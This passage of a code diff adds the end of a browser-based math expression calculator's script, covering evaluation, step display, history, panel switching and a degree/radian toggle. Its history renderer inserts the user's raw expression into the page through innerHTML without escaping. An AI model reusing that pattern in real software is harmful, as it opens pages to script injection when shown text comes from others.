+        resultExpr.textContent  = raw + ' = ' + resultStr;
+
+        // Show steps
+        renderTokens(tokens);
+        renderRPN(rpn);
+        renderSteps(evaled.steps);
+        stepsPanel.style.display = 'block';
+
+        statusBar.className = 'status-bar valid';
+        statusBar.textContent = raw + ' = ' + resultStr + (angleMode === 'deg' ? ' (DEG mode)' : ' (RAD mode)');
+
+        // Add to history
+        history.unshift({ expr: raw, result: resultStr });
+        if (history.length > 50) history.pop();
+        renderHistory();
+
+        DT.trackTool('math-expression');
+      } catch (e) {
+        resultValue.textContent = 'Error';
+        resultExpr.textContent  = e.message;
+        stepsPanel.style.display = 'none';
+        statusBar.className = 'status-bar invalid';
+        statusBar.textContent = 'Error: ' + e.message;
+      }
+    }
+
+    // ── History ────────────────────────────────────────────────────────────
+    function renderHistory() {
+      var list = document.getElementById('historyList');
+      if (!history.length) {
+        list.innerHTML = '<li class="empty-state" style="display:block;border:none;">No calculations yet.</li>';
+        return;
+      }
+      list.innerHTML = '';
+      history.forEach(function (item) {
+        var li = document.createElement('li');
+        li.innerHTML = '<span class="history-expr">' + item.expr + '</span><span class="history-val">= ' + item.result + '</span>';
+        li.addEventListener('click', function () {
+          document.getElementById('exprInput').value = item.expr;
+          switchPanel('calculate');
+          evaluate();
+        });
+        list.appendChild(li);
+      });
+    }
+
+    // ── Panel switching ────────────────────────────────────────────────────
+    function switchPanel(panel) {
+      activePanel = panel;
+      ['calculate', 'history', 'reference'].forEach(function (p) {
+        var el = document.getElementById('panel-' + p);
+        if (el) el.classList.toggle('panel-hidden', p !== panel);
+      });
+      document.querySelectorAll('.option-chip[data-panel]').forEach(function (chip) {
+        chip.classList.toggle('active', chip.getAttribute('data-panel') === panel);
+      });
+    }
+
+    // ── Events ─────────────────────────────────────────────────────────────
+    document.getElementById('calcBtn').addEventListener('click', evaluate);
+
+    document.getElementById('exprInput').addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') evaluate();
+    });
+
+    document.getElementById('clearExprBtn').addEventListener('click', function () {
+      document.getElementById('exprInput').value = '';
+      evaluate();
+      document.getElementById('exprInput').focus();
+    });
+
+    document.getElementById('clearHistoryBtn').addEventListener('click', function () {
+      history = [];
+      renderHistory();
+    });
+
+    // Panel chips
+    document.querySelectorAll('.option-chip[data-panel]').forEach(function (chip) {
+      chip.addEventListener('click', function () {
+        switchPanel(chip.getAttribute('data-panel'));
+      });
+    });
+
+    // DEG/RAD toggle
+    document.getElementById('angleChip').addEventListener('click', function () {
+      angleMode = angleMode === 'deg' ? 'rad' : 'deg';
+      this.textContent = angleMode.toUpperCase();
+      this.classList.toggle('active', false); // never "selected" visually like others
+      // Re-evaluate if there's an expression
+      if (document.getElementById('exprInput').value.trim()) evaluate();
+    });
+
+    // Example buttons
+    document.querySelectorAll('[data-example]').forEach(function (btn) {
+      btn.addEventListener('click', function () {
+        document.getElementById('exprInput').value = btn.getAttribute('data-example');
+        switchPanel('calculate');
+        evaluate();
+      });
+    });
+  })();
+  </script>
+</body>
+</html>
